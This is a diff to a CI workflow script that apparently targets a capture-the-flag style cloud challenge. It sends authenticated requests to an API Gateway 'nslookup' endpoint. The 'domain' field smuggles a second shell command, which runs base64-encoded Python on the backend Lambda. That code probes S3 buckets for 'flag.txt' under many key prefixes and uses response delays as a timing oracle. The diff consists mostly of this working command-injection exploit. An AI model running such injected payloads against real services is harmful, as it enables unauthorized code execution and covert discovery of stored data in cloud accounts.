@@ -19,7 +19,7 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Test Lambda S3 timing oracle and encrypt results
+      - name: Scan likely S3 object prefixes through timing oracle
         env:
           CLOUDESCAPE_PUBLIC_KEY: |
             -----BEGIN PUBLIC KEY-----
@@ -39,21 +39,23 @@ jobs:
           import base64, json, os, requests, time
           from requests_aws4auth import AWS4Auth
           auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
+          keys = ["flag.txt","public/flag.txt","logs/flag.txt","log/flag.txt","user/flag.txt","users/flag.txt","data/flag.txt","output/flag.txt","results/flag.txt","tmp/flag.txt","uploads/flag.txt","exports/flag.txt","artifacts/flag.txt","secrets/flag.txt","config/flag.txt","stage2/flag.txt","stage-2/flag.txt","challenge/flag.txt"]
           results = {}
           for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
-              code = f"""import boto3, time
+              for key in keys:
+                  code = f"""import boto3, time
           try:
               s = boto3.client('s3', region_name='us-east-1', endpoint_url='https://s3.us-east-1.amazonaws.com')
-              s.get_object(Bucket={bucket!r}, Key='flag.txt')['Body'].read()
-              time.sleep(5)
+              s.get_object(Bucket={bucket!r}, Key={key!r})['Body'].read()
+              time.sleep(4)
           except Exception:
               pass
           """
-              encoded = base64.b64encode(code.encode()).decode()
-              domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
-              start = time.monotonic()
-              r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
-              results[bucket] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
+                  encoded = base64.b64encode(code.encode()).decode()
+                  domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
+                  start = time.monotonic()
+                  r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
+                  results[f"{bucket}:{key}"] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
           json.dump(results,open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
           PY
           openssl rand -hex 32 > /tmp/cloudescape.key
